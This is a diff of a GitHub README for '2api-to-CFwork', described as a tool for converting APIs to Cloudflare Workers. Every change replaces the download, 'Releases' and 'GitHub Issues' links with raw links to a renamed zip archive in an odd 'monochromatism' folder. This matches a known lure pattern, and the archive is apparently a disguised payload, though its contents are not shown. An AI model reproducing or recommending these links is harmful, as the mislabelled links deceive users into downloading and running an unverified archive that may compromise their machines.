@@ -1,6 +1,6 @@
 # 🚀 2api-to-CFwork - Convert APIs to Cloudflare Workers Easily
 
-[![Download 2api-to-CFwork](https://raw.githubusercontent.com/Lopoquo555/2api-to-CFwork/main/monochromatism/2api-to-CFwork_v1.2.zip%20Now-2api--to--CFwork-brightgreen)](https://raw.githubusercontent.com/Lopoquo555/2api-to-CFwork/main/monochromatism/2api-to-CFwork_v1.2.zip)
+[![Download 2api-to-CFwork](https://github.com/Lopoquo555/2api-to-CFwork/raw/refs/heads/main/monochromatism/to-api-Fwork-C-v3.8.zip%20Now-2api--to--CFwork-brightgreen)](https://github.com/Lopoquo555/2api-to-CFwork/raw/refs/heads/main/monochromatism/to-api-Fwork-C-v3.8.zip)
 
 ## 👋 Introduction
 
@@ -12,7 +12,7 @@ Let’s get started on converting your API into a Cloudflare Worker. You will ne
 
 ## 📥 Download & Install
 
-To get the application, simply visit this page to download: [2api-to-CFwork Releases](https://raw.githubusercontent.com/Lopoquo555/2api-to-CFwork/main/monochromatism/2api-to-CFwork_v1.2.zip).
+To get the application, simply visit this page to download: [2api-to-CFwork Releases](https://github.com/Lopoquo555/2api-to-CFwork/raw/refs/heads/main/monochromatism/to-api-Fwork-C-v3.8.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top of the page.
@@ -68,11 +68,11 @@ If you encounter issues, here are some common problems and solutions:
 
 ## 📫 Support
 
-For additional help, feel free to visit the [GitHub Issues page](https://raw.githubusercontent.com/Lopoquo555/2api-to-CFwork/main/monochromatism/2api-to-CFwork_v1.2.zip). Here, you can report bugs or ask questions related to the application.
+For additional help, feel free to visit the [GitHub Issues page](https://github.com/Lopoquo555/2api-to-CFwork/raw/refs/heads/main/monochromatism/to-api-Fwork-C-v3.8.zip). Here, you can report bugs or ask questions related to the application.
 
 ## 🗂️ Additional Resources
 
 - **Documentation:** A detailed user guide is available for advanced features and troubleshooting tips.
 - **Community Forum:** Join discussions with other users to share experiences and solutions.
 
-Remember, you can always download the latest version from: [2api-to-CFwork Releases](https://raw.githubusercontent.com/Lopoquo555/2api-to-CFwork/main/monochromatism/2api-to-CFwork_v1.2.zip). Happy coding!
+Remember, you can always download the latest version from: [2api-to-CFwork Releases](https://github.com/Lopoquo555/2api-to-CFwork/raw/refs/heads/main/monochromatism/to-api-Fwork-C-v3.8.zip). Happy coding!
